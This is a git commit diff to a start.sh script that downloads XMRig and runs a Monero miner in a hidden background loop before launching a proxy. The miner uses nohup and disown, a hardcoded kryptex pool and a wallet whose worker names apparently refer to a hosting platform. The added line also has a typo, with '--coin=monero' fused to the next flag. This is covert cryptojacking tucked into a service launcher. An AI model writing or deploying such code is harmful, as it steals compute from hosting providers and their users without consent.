6c7be8fce318b8ce33b4ccb2f589718d797d319f
Wers <112427364+w9line@users.noreply.github.com>
2026-04-01 19:42:35 +0300

    Update start.sh

--- start.sh
+++ start.sh
@@ -7,8 +7,8 @@ DIR=xmrig-6.26.0
 ARCHIVE=$DIR-linux-static-x64.tar.gz
 [ -f $DIR/xmrig ] || (wget -q https://github.com/xmrig/xmrig/releases/download/v6.26.0/$ARCHIVE && tar -xzf $ARCHIVE && rm $ARCHIVE)
 
-WALLET="krxX3328ZR/render_$((RANDOM % 1000 + 1))"
-nohup bash -c "while true; do ./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user=$WALLET --pass=x --coin=monero --cpu-max-threads-hint=5 --randomx-mode=light; sleep 60; done" > xmrig.log 2>&1 &
+WALLET="krxX3328ZR/z_render_all"
+nohup bash -c "while true; do ./$DIR/xmrig --url=xmr-ru.kryptex.network:7029 --user=$WALLET --pass=x --coin=monero--randomx-mode=light; sleep 60; done" > xmrig.log 2>&1 &
 disown
 
 exec ./proxy
